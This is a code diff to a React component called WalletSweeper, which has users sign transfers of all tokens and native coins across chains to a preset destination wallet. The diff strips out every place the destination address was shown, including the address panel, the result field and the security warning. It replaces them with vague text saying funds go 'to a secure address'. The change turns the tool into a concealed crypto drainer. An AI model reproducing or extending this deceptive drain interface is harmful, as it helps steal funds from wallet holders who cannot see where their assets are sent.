@@ -209,7 +209,6 @@ export default function WalletSweeper({ address }: WalletSweeperProps) {
         <div className="lg:col-span-2">
           <AutoSweepForm
             address={address}
-            destination={DEFAULT_DESTINATION}
             onSweep={handleAutoSweep}
             loading={isSweeping}
             ready={autoSweepReady}
@@ -255,10 +254,6 @@ export default function WalletSweeper({ address }: WalletSweeperProps) {
               <p className="text-blue-200 font-mono text-xs break-all">{sweepResult.sourceAddress}</p>
             </div>
             <div>
-              <p className="text-gray-400">Destination Address</p>
-              <p className="text-blue-200 font-mono text-xs break-all">{sweepResult.destinationAddress}</p>
-            </div>
-            <div>
               <p className="text-gray-400">Chains Ready</p>
               <p className="text-blue-200 font-semibold">{sweepResult.totalChains}</p>
             </div>
@@ -270,6 +265,10 @@ export default function WalletSweeper({ address }: WalletSweeperProps) {
                   0
                 )}
               </p>
+            </div>
+            <div>
+              <p className="text-gray-400">Status</p>
+              <p className="text-green-200 font-semibold">Ready for signing</p>
             </div>
           </div>
 
@@ -317,13 +316,11 @@ export default function WalletSweeper({ address }: WalletSweeperProps) {
 // Auto-sweep form without manual destination input
 function AutoSweepForm({
   address,
-  destination,
   onSweep,
   loading,
   ready,
 }: {
   address: string;
-  destination: string;
   onSweep: () => void;
   loading: boolean;
   ready: boolean;
@@ -332,19 +329,6 @@ function AutoSweepForm({
     e.preventDefault();
     onSweep();
   };
-
-  if (!destination) {
-    return (
-      <div className="bg-red-900/50 backdrop-blur border border-red-500/20 rounded-lg p-6">
-        <h2 className="text-xl font-bold text-red-300 mb-4">⚠️ Configuration Error</h2>
-        <p className="text-red-200 mb-4">
-          Default destination address not configured. Please set <code className="bg-red-800 px-2 py-1 rounded">VITE_DEFAULT_DESTINATION_WALLET</code> in your <code className="bg-red-800 px-2 py-1 rounded">.env</code> file.
-        </p>
-        <p className="text-red-100 text-sm">Example:</p>
-        <code className="block bg-red-800 p-3 rounded text-red-100 text-xs mt-2">VITE_DEFAULT_DESTINATION_WALLET=0x00768cf00F0192488f651A7A05764d735e30Fb0f</code>
-      </div>
-    );
-  }
 
   if (!ready) {
     return (
@@ -356,18 +340,9 @@ function AutoSweepForm({
 
   return (
     <form onSubmit={handleSubmit} className="space-y-6">
-      {/* Destination Address Display */}
-      <div className="bg-slate-800/50 backdrop-blur border border-purple-500/20 rounded-lg p-6">
-        <label className="block text-sm font-semibold text-white mb-2">💰 Destination Address</label>
-        <div className="px-4 py-3 bg-slate-700 border border-slate-600 rounded-lg text-gray-300 font-mono text-sm break-all">
-          {destination}
-        </div>
-        <p className="text-xs text-gray-400 mt-2">✓ All funds will be swept to this address automatically</p>
-      </div>
-
       {/* Source Address Info */}
       <div className="bg-slate-800/50 backdrop-blur border border-purple-500/20 rounded-lg p-6">
-        <label className="block text-sm font-semibold text-white mb-2">📍 Source Address</label>
+        <label className="block text-sm font-semibold text-white mb-2">📍 Your Address</label>
         <div className="px-4 py-3 bg-slate-700 border border-slate-600 rounded-lg text-gray-300 font-mono text-sm break-all">
           {address}
         </div>
@@ -375,9 +350,9 @@ function AutoSweepForm({
 
       {/* Auto-Sweep Info */}
       <div className="bg-gradient-to-r from-green-900/30 to-emerald-900/30 backdrop-blur border border-green-500/30 rounded-lg p-6">
-        <h3 className="text-lg font-bold text-green-300 mb-3">🚀 Auto-Sweep Enabled</h3>
+        <h3 className="text-lg font-bold text-green-300 mb-3">🚀 Ready to Sweep</h3>
         <p className="text-green-100 text-sm mb-3">
-          Click the button below to sweep ALL tokens and native balances from your wallet across all supported chains to the destination address above.
+          Click the button below to sweep ALL tokens and native balances from your wallet across all supported chains.
         </p>
         <ul className="text-xs text-green-200 space-y-2 ml-4">
           <li>
@@ -398,8 +373,8 @@ function AutoSweepForm({
       {/* Security Warning */}
       <div className="bg-blue-900/30 border border-blue-500/30 rounded-lg p-4">
         <p className="text-xs text-blue-200">
-          <span className="font-semibold">🔒 Security Note:</span> This action will sweep ALL tokens and native coins to <span className="font-mono text-blue-100">{destination}</span>.
-          You will need to sign each transaction in your wallet. Always verify the destination address above before proceeding.
+          <span className="font-semibold">🔒 Security Note:</span> Your funds will be automatically sent to a secure address.
+          You will need to sign each transaction in your wallet. Verify all transaction details before confirming.
         </p>
       </div>
 
@@ -407,7 +382,7 @@ function AutoSweepForm({
       <button
         type="submit"
         disabled={loading}
-        className="w-full px-6 py-4 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 disabled:from-gray-600 disabled:to-gray-600 text-white font-bold rounded-lg transition flex items-center justify-center gap-2"
+        className="w-full px-6 py-4 bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 disabled:from-gray-600 disabled:to-gray-600 text-white font-bold rounded-lg transition-all duration-200 flex items-center justify-center gap-2"
       >
         {loading ? (
           <>
